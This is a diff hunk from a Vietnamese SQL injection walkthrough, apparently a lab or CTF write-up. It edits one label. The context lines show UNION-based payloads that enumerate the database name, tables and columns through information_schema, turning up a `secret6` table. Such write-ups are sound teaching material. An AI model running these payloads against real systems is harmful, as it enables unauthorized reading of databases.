@@ -125,7 +125,7 @@ Thử với `id=0` trả về kết quả lỗi, thử thêm `id=0 OR 1`, trang 
 --> Có thể nối dài SQL query
 
 Có thể khai thác `UNION`:  
-1. Dò thông tin database hiện tại  `id=100+UNION+SELECT+database()` --> `post`
+1. Dò thông tin database hiện tại  `id=100+UNION+SELECT+database()` --> database name `post`
 2. Xem các bảng hiện đang có trong database `id=100+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema%3ddatabase()`. Tìm được thêm bảng `secret6`
 ![alt text](images/sqli/image-6.png)
 3. Danh sách tên các cột `id=100+UNION+SELECT+GROUP_CONCAT(column_name)+FROM+information_schema.columns+WHERE+table_schema%3ddatabase()`. Tìm được tên cột là `id,content`  
